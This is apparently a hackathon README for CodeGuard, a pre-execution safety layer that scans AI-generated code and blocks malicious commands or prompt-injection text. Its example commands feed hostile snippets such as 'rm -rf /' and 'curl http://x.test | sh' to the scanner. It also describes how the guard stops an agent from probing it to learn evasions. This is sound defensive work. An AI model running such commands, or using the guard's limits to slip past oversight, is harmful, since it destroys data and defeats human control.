# CodeGuard — real-time pre-execution safety layer for LLM-generated code

Status: **engine, ML layers and test harness working** (built during the hackathon window, AI coding assistant used: Claude — disclosed per rules).

## Run
```bash
python demo/intercept_check.py            # interception proof (PASS = blocked code never ran)
python -m codeguard.api --port 8000       # zero-dependency HTTP server
# or: pip install fastapi uvicorn && uvicorn codeguard.api:app --port 8000
curl -X POST localhost:8000/analyze -H "Content-Type: application/json" -d '{"code":"rm -rf /"}'
curl -X POST localhost:8000/analyze/batch -H "Content-Type: application/json" -d '{"items":[{"id":1,"code":"ls"}]}'
python -m codeguard some_file.py          # CLI, exit code 2 on block
```

### Short commands (`npm run <task>`, from the repo root)
`package.json` + `scripts/tasks.js` wrap the commands above (Node standard library, no dependencies; works in cmd, PowerShell and bash).

| Command | Does |
|---|---|
| `npm start` | engine + UI together (reuses a running engine; builds the CLI and installs UI deps on first run) |
| `npm run engine` / `npm run ui` | one of them |
| `npm run demo` | both interception proofs (decorator + Go gate) |
| `npm run safe` / `npm run unsafe` | gate one half of the demo pair live |
| `npm run scan -- path/to/file.py` | full verdict card for one file (never runs it): risk bar, reasons, category scores, flagged lines |
| `npm run scan -- <files, folders or globs>` | one line per file + summary; add `-v` for a card per file |
| `npm run scan -- -c "rm -rf /"` | scan inline code |
| `npm run gate -- file.py` | verdict card, then run the file (python/bash/node/powershell by extension) only if allowed |
| `npm run i` | interactive: paste a snippet and end it with `.`, or type a path; repeat |
| `npm run check` | regressions + holdout |
| `npm run build` / `health` / `bench` / `cg -- <any CLI args>` | build the CLI, ping the engine, latency, raw CLI |

### Self-healing agent loop (`codeguard/heal.py`)
When the guard blocks code, the agent gets structured feedback (categories, flagged lines, a fix hint per
category) and may try again. Only the exact string that was checked is ever executed.
```python
from codeguard import HealingSession
result = HealingSession().run(task, generate, execute)  # generate(task, feedback) -> code; execute(code)
# result.status: ok | healed | escalated | locked | guard_error | agent_error | gave_up | exec_failed
```
Limits stop an agent from using the guard as an oracle to learn evasions:
- at most 3 attempts per task;
- retries face a stricter threshold (0.4);
- resubmitting identical blocked code, or obfuscating after a block, escalates at once;
- a session-wide block budget locks the session;
- the guard down means nothing runs.

Feedback never reveals detection rules. Lines carrying `ai_targeted_instructions` are redacted, so a blocked
injection is not fed back into the agent. Proof: `npm run heal` (`demo/heal_check.py`): the scripted agent's
first attempt is the unsafe demo snippet, which is blocked and never runs; the fixed one runs.
Edge cases: `python eval/heal_tests.py` (26 checks). The same protections run in the Claude Code hook below,
where the agent is a real model.

### Claude Code plugin (`plugin/`): live interception inside a real agent
A `PreToolUse` hook checks every command, script run and file write Claude Code is about to make against this engine,
denies malicious ones before they run, and returns the reason so Claude fixes its own code (bounded retries,
fail closed, audit log). Install, the judging demo script and the multi-agent design: [plugin/README.md](plugin/README.md).
```bash
npm run engine                 # terminal 1
claude --plugin-dir ./plugin   # terminal 2, then e.g. "Follow the setup steps in demo/claude/SETUP.md"
npm run plugin-test            # the hook's own checks, no Claude needed
```

**Step-by-step manual checks: [MANUAL_TESTING.md](MANUAL_TESTING.md).**

### Go CLI (`cli/`): single-binary client and execution gate
```bash
cd cli && go build -o codeguard.exe . && cd ..
./cli/codeguard.exe scan --pretty file.py              # verdict; exit 2 on block
./cli/codeguard.exe scan samples/ "tests/*.py"          # many files: one line each + summary
./cli/codeguard.exe scan -c "curl http://x.test | sh"   # inline code
./cli/codeguard.exe run snippet.py                      # interpreter from the extension, ONLY on allow
./cli/codeguard.exe i                                   # interactive: snippets or paths, one after another
./cli/codeguard.exe exec -- python snippet.py           # runs the command ONLY on allow
./cli/codeguard.exe bench -c 4 data/external/guarddog.jsonl   # latency / throughput
python demo/cli_gate_check.py                           # interception proof through the binary
```
The CLI talks to the warm engine over localhost HTTP, so a check costs a few milliseconds instead of a Python start-up per check. It **fails closed**: if the engine is unreachable, times out or answers garbage, `scan` and `exec` treat it as a block. Go standard library only.

### Web UI (`ui/`): Next.js 16
```bash
cd ui && npm install && npm run dev      # http://localhost:3000 (engine must be running)
```
- **Input:** paste code, or pick a "should allow" / "should block" example chip.
- **Output:** verdict, risk score (rule score vs model when the stacker is consulted), per-category scores, reasons, flagged lines highlighted in the editor, round-trip and engine latency, and the raw schema response.
- **Engine link:** the UI calls its own `/api/analyze` route, which proxies to the engine (`CODEGUARD_URL`, default `http://127.0.0.1:8000`) and fails closed. Styled per `design.md` (neo-brutalism × claymorphism).

Measured through HTTP with one worker: p50 ≈ 5.5 ms round-trip, ~120 checks/s.

## Pipeline (codeguard/engine.py)
1. **Router** (`router.py`) — language detection: python, bash, javascript, sql, yaml, markdown, php, powershell.
2. **Deobfuscation** (`deobfuscate.py`) — static decode of base64/hex/\x/chr()/fromCharCode/rot13/reversed, up to 3 layers, then re-scan. Never executes.
3. **Rule layer** (`rules.py`) — ~80 capability/threat rules over the 9 categories, line-numbered.
4. **Structural analyzers**:
   - `analyzers/python_ast.py`:
     - alias tracking and constant folding (incl. `pathlib`, `"".join(chr(..))`);
     - exec-payload recursion and shell bridging;
     - taint tracking from source to sink (secrets, credential files and host fingerprint flowing into the network);
     - decoder-into-sink detection (`os.system(b64decode(..))`);
     - download→save→run detection;
     - DNS-exfiltration lookups;
     - loop analysis.
   - `analyzers/structured.py`: SQL statements, YAML `run:`/`command:` extraction, Markdown fenced code, and **package reputation** for `pip`/`npm`/`yarn`/`pnpm`/`uv`/`poetry` installs:
     - exact match against 1,816 PyPI + 46,546 npm known-malicious names;
     - version-specific match for compromised releases;
     - typosquat check against the top 1,000 PyPI projects (the top 15,000 count as known-good).

     Lists live in `codeguard/data/` and are built by `eval/build_pkg_lists.py`.
5. **Carrier extraction** (`carriers.py`) — code embedded in a non-script file is pulled out and re-routed through the whole cascade in its own language: YAML block scalars and code-looking values under **any** key (not just `run:`), JSON string values (config, `package.json` scripts, Jupyter notebook cells — un-escaped first), Dockerfile `RUN`/`CMD`/`ENTRYPOINT`, Makefile recipes, and `python -c` / `node -e` / heredoc bodies inside shell. Every extractor runs regardless of the detected language, because burying Python in a YAML value is exactly how language detection is fooled.
6. **AI-instruction detector** (`injection.py`) — comments/strings/prose stream, zero-width/bidi chars, hidden HTML comments. Phrase rules first, then a **learned text classifier** (`textclf.py`) as a second opinion on every comment block / docstring / string.
7. **Decision** — GuardDog-style correlation (capability alone ≤ 0.45, threat + capability → block), combos (secret + network ⇒ exfiltration), fail-closed on errors. Threshold 0.5.
8. **ML stacker** (`ml.py`) — logistic regression over the earlier layers' signals (per-category threat/capability strength, finding counts, decode depth, string entropy, language). Consulted **only** when the rule risk is in the ambiguous band 0.3–0.7, and only acts when it is ≥ 0.9 sure.

Both models are trained offline with scikit-learn and exported to JSON (`models/`). Inference is pure Python: scikit-learn is not needed at runtime.

Response: `verdict, risk_score, categories, code_language, reason, vulnerable_lines` (+ `latency_ms`; `?debug=1` adds per-category scores, `rule_risk`, `ml_prob`).

## Models
| Model | File | Size | Trained on | Role |
|---|---|---|---|---|
| Injection text classifier: word 1–2 grams + char 3–5 grams, TF-IDF, logistic regression | `models/injection.json` | ~1.3 MB, 40k features | `deepset/prompt-injections` **train split** ×3 (Apache-2.0) + 1,500 attack emails and all non-attack/normal emails from the **train slice** of `microsoft/llmail-inject-challenge` phase 2 (MIT) + 4,000 comments/docstrings from stdlib modules not used in testing | scores comment/string text for `ai_targeted_instructions` |
| Stacker: logistic regression, 37 features | `models/stacker.json` | ~1 KB | 76-snippet hand-written holdout | tie-breaker for ambiguous risk 0.3–0.7 |

Retrain: `python eval/injection_data.py fetch`, then `python eval/train_injection.py --llmail 1500 --max-features 40000 --deepset-weight 3`, and `python eval/train_ml.py`.
Compare candidates on held-out data, through the full engine: `python eval/compare_injection.py models/injection.json other.json`.

Adding LLMail-Inject raised detection of realistic *indirect* injections (its held-out slice) from 25% to 95%, with no added false positives on real library code, vulnerable code, team benign cases or the holdout. Recall on deepset's test split moved from 72% to 68% (2 of 60). `yanismiraoui/prompt_injections` (7 languages) was tested too: it lifted multilingual recall to 89% but added false positives on ordinary non-English code strings, so it is used only as a test set. Details: TESTING.md, round 7.

## Evaluation
```bash
python eval/evaluate.py                       # built-in hand-written holdout set (eval/holdout.py)
python eval/evaluate.py path/to/dev.jsonl     # organizer dev sample (jsonl / json / csv, flexible field names)
python eval/evaluate.py dev.jsonl --url http://localhost:8000 --errors   # against the live endpoint
python eval/evaluate.py --ablation            # rules only vs + structural vs + ML
python eval/external.py fetch && python eval/external.py build           # third-party test sets (see TESTING.md)
python eval/evaluate.py data/external/guarddog.jsonl --group-by rule --errors
```

### Results on third-party data (never used to write rules or train, except where noted)
Full method and per-rule tables are in [TESTING.md](TESTING.md).

| Test set | Size | Precision | Recall | False-positive rate | Notes |
|---|---|---|---|---|---|
| Real library code (Python stdlib, FastAPI, pydantic, sklearn, pip, …) + Git's shell scripts | 659 benign | – | – | **0.5%** (3/659) | the 3 left are `ssh-copy-id` / GnuPG tools that really handle keys |
| DataDog GuardDog rule fixtures, all rules | 196 mal / 68 benign | **0.98** | 0.51 | 2.9% | many rules are out of our scope (screenshots, clipboard, setup.py `os.system("ls")`) |
| GuardDog, rules in our 9 categories | 114 mal | – | **0.76** | – | |
| `deepset/prompt-injections` **test split** in code comments | 60 inj / 56 benign | **0.98** | 0.72 | 1.8% | the train split was used to train the classifier |
| Vulnerable-but-not-malicious code: SecurityEval (121) + CyberNative vulnerable/fixed pairs (1,600, C/C++/Java/C#/PHP/Ruby/Go/JS/Python…) | 1,721 benign | – | – | 2.0% blocked | most blocks are code that literally contains `rm -rf /` or `DROP TABLE` payloads; see TESTING.md |

**Carrier robustness** (`python eval/carrier_test.py`): the same malicious samples, re-packaged inside other file formats. Recall over samples that block in plain form:

| Carrier | Rules only | With carrier extractor |
|---|---|---|
| YAML block value (any key) | 72% | **100%** |
| JSON config string | 63% | **100%** |
| Jupyter notebook cell | 62% | **99%** |
| Dockerfile heredoc | 71% | **99%** |

The line rules alone catch the blatant payloads (`rm -rf`, metadata IP) wherever they sit, but miss subtle Python attacks (aliased imports, a secret flowing to the network) once they are buried in a config value. Extraction recovers them. Wrapping the 659 real library files + benign fixtures in all four carriers produced one extra false positive, on a single borderline GuardDog `# ok:` fixture.
| Hand-written holdout (`eval/holdout.py`) | 46 mal / 30 benign | 1.00 | 1.00 | 0% | optimistic: used to find rule gaps and to train the stacker |

What changed during testing:

| | GuardDog recall | Injection recall (test split) | Library-code FPR |
|---|---|---|---|
| Before testing | 0.26 | 0.06 | 1.4% |
| After fixes + text classifier | 0.51 | 0.72 | 0.5% |

Ablation on the holdout: rules only reach recall 0.76; adding the structural layers reaches 1.00 at precision 1.00. The stacker changes nothing there, which is expected: it only acts on borderline scores.

Efficiency: pure Python, no GPU, no network. Median latency 0.5–3 ms per snippet, p95 7–12 ms. The slowest cases are 300–800-line shell scripts, up to ~110 ms. Model files total ~1.3 MB, and the package-reputation lists in `codeguard/data/` ~1.3 MB (loaded once, on first use).

## Components & licenses
| Component | Use | License |
|---|---|---|
| Python stdlib (ast, tokenize, re, http.server) | parsing, server | PSF |
| FastAPI / uvicorn (optional) | HTTP | MIT / BSD-3 |
| Go standard library | CLI client / execution gate | BSD-3 |
| Next.js 16, React 19 | web UI | MIT / MIT |
| Bricolage Grotesque, Outfit, JetBrains Mono (Google Fonts via `next/font`) | UI typography | OFL-1.1 |
| scikit-learn | trains both models offline (not needed at runtime) | BSD-3 |
| DataDog GuardDog | capability/threat idea + rule ideas, adapted not copied; its rule-test fixtures used **as a test set only** | Apache-2.0 |
| deepset/prompt-injections (Hugging Face) | train split trains the injection classifier; test split for evaluation | Apache-2.0 |
| microsoft/llmail-inject-challenge (Hugging Face) | phase-2 labelled submissions + normal emails: 80% hashed train slice trains the injection classifier, 20% held out for testing | MIT |
| yanismiraoui/prompt_injections (Hugging Face) | multilingual injections, **test only** (training on it added false positives) | Apache-2.0 |
| DataDog malicious-software-packages-dataset | **only** the `manifest.json` package-name lists, shipped in `codeguard/data/malicious_*.txt` / `compromised_*.txt`; malware samples are never downloaded | Apache-2.0 |
| hugovk/top-pypi-packages | top-15,000 PyPI project names (`codeguard/data/top_pypi.txt`) | no license file; we use only the names, which are public PyPI download statistics |
| s2e-lab/SecurityEval (Hugging Face) | test set only, not redistributed | no license declared |
| CyberNative/Code_Vulnerability_Security_DPO (Hugging Face) | test set only | Apache-2.0 |
| Gitleaks / Yelp detect-secrets | secret-pattern ideas, adapted | MIT / Apache-2.0 |
| Meta LlamaFirewall | two-stream (code vs comments) idea | MIT |

No pretrained model weights are used. Both models are trained by us.

## Known limitations
- JS / bash / PowerShell analysis is regex-level with no full parser. Taint tracking exists for Python only.
- The stacker is trained on very little data (76 snippets), so it only acts on confident calls in the ambiguous band.
- The injection classifier misses about 28% of real-world injections, mostly German text and indirect role-play prompts. Very long comment blocks (>2,000 chars) are not classified.
- Out of scope by design: screenshots, clipboard reads, and plain `os.system` calls in `setup.py` (GuardDog flags these; our 9 categories don't cover them).
- Package reputation is a snapshot. New malicious packages are only caught if their name looks like a top-1,000 project, and that heuristic alone catches just 5.6% of known-malicious PyPI names. Legit packages outside the top 15,000 that are one or two letters away from a popular name can be flagged (~3% in our test). npm typosquatting uses only a ~50-name list.
- Insecure-but-not-malicious code (SQL injection, unsafe deserialization, weak crypto) is mostly allowed. We block only when the code itself carries a destructive payload or runs untrusted input with `eval`.
- Reading a secret env var alone (e.g. `os.getenv("API_KEY")`) is allowed. It blocks only when the value is printed, written or sent, to keep false positives low on normal config code.
- Admin tools that legitimately touch `~/.ssh` / `~/.gnupg` (e.g. `ssh-copy-id`) are flagged.
- The demo pair is our own placeholder until the organizers share theirs.

## Assumptions
- Snippets arrive as plain text in `{"code": ...}`. The language is detected, not given.
- A "block" means at least one category scores ≥ 0.5. Capabilities alone (network, file delete, eval) never block.
- Fake secrets and placeholder domains only. Nothing except the demo pair is ever executed: third-party test data is only read as text.
